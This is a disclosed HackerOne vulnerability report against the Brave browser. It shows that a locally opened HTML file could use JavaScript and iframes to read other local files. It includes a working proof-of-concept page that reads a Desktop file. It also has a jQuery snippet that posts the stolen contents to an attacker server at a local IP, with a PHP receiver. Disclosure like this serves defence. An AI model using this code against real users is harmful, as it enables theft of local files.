---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '175979'
original_report_id: '175979'
title: Access to local file system using javascript
team_handle: brave
created_at: '2016-10-15T11:27:39.225Z'
disclosed_at: '2016-11-16T06:20:10.097Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 13
tags:
- hackerone
---

# Access to local file system using javascript

## Metadata

- HackerOne Report ID: 175979
- Weakness: 
- Program: brave
- Disclosed At: 2016-11-16T06:20:10.097Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey,

The browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.


```
<html>
<body>
<div id='div1'>
</div>
<script>
current_href = document.location.href
frame = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)
setTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML
alert('Your data is: ' + loot)
}, 500)
</script>
</body>
</html>
```

I was able to do this with some simple html as you can see above.
This loads a file called 'Desktop.txt' from the downloads folder and creates an alert message with the file content. I would have been able to post it to my server using jquery like this:

```
//Gets data from iframe and saves it to the getdata variable
getdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML
//Posts to the php server located at 192.168.0.106 (local address for demo purposes)
$.ajax({type: "POST", url: "http://192.168.0.106/post.php", data: {string:getdata}});}
```

```
//Can be retrieved with php using:
$_POST['string'];
```

This only works if the html file is opened locally as i mentioned earlier,
Karel.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
